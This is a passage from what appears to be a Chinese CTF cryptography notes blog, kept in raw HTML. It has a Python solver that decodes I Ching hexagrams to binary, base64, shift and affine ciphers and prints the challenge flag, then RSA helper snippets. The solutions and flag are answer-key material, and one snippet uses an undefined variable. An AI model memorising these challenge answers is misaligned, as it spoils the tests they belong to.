punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>keys<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> mingwen    mingwen<span class="token operator">=</span>enc    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        mingwen<span class="token operator">=</span>mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span>mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这有了之后，后面的解题过程挺简单的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -- coding:UTF-8 --</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> stringenc <span class="token operator">=</span> <span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>mydisc <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span>          <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span>          <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span>          <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span>          <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span>          <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span>          <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span>          <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span>          <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span>          <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span>        <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span>        <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decrypt1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> mingwen    mingwen <span class="token operator">=</span> enc    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        mingwen <span class="token operator">=</span> mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span> mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>    mingwen <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span class="token punctuation">)</span>decrypt1<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP</span>temp <span class="token operator">=</span> <span class="token string">"n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP"</span><span class="token triple-quoted-string string">"""def encrpyt5():    enc = ''    for i in flag:        enc += chr((a * (ord(i) - 97) + b) % 26 + 97)    return (enc)def encrypt4():    temp = ''    offset = 5    for i in range(len(enc)):        temp += chr(ord(enc[i]) - offset - i)    return (temp)"""</span><span class="token keyword">def</span> <span class="token function">decrypto4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc <span class="token operator">=</span> <span class="token string">''</span>    offset <span class="token operator">=</span> <span class="token number">5</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span>    <span class="token keyword">return</span> encletter <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token keyword">def</span> <span class="token function">decrypto5</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 没给b的仿射密码，爆破b</span>    aa <span class="token operator">=</span> <span class="token number">1</span>    b <span class="token operator">=</span> <span class="token number">7</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            aa <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        flag <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> letter<span class="token punctuation">[</span><span class="token punctuation">(</span>aa <span class="token operator">*</span> <span class="token punctuation">(</span>letter<span class="token punctuation">.</span>index<span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            <span class="token keyword">return</span> flagenc <span class="token operator">=</span> decrypto4<span class="token punctuation">(</span><span class="token punctuation">)</span>decrypto5<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token comment"># bjdcongratulationsongettingtheflag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><h3 id="各种参数的求取"><a href="#各种参数的求取" class="headerlink" title="各种参数的求取"></a>各种参数的求取</h3><h4 id="有e-d和n如何求出phi"><a href="#有e-d和n如何求出phi" class="headerlink" title="有e*d和n如何求出phi"></a>有<code>e*d</code>和<code>n</code>如何求出<code>phi</code></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">K<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>即</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">phi<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="有phi和n如何分解n"><a href="#有phi和n如何分解n" class="headerlink" title="有phi和n如何分解n"></a>有<code>phi</code>和<code>n</code>如何分解<code>n</code></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">solve_p</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> P_n<span class="token punctuation">)</span> <span class="token comment"># =p-q</span>    p <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    q <span class="token operator">=</span> n <span class="token operator">//</span> p    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="中国剩余定理求通解"><a href="#中国剩余定理求通解" class="headerlink" title="中国剩余定理求通解"></a>中国剩余定理求通解</h4><p>这个就是有几个参数求X的那个，几个式子最后可以求得未知量。</p><pre class="line-numbers language-none"><code class="language-none">def merge(a1, n1, a2, n2):    d &#x3D; gmpy2.gcd(n1, n2)    c &#x3D; a2 - a1    if c % d !&#x3D; 0:        return 0    c &#x3D; (c % n2 + n2) % n2    c &#x3D; c &#x2F;&#x2F; d    n1 &#x3D; n1 